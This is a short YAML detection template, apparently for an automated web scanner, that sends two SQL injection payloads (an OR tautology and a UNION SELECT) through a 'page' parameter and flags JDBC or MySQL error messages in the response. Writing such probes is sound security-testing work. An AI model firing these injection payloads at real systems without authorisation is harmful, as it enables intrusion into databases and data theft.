id: sqli6-generic-07
name: 'SQLi generic probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''') OR (''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'Warning: mysql'
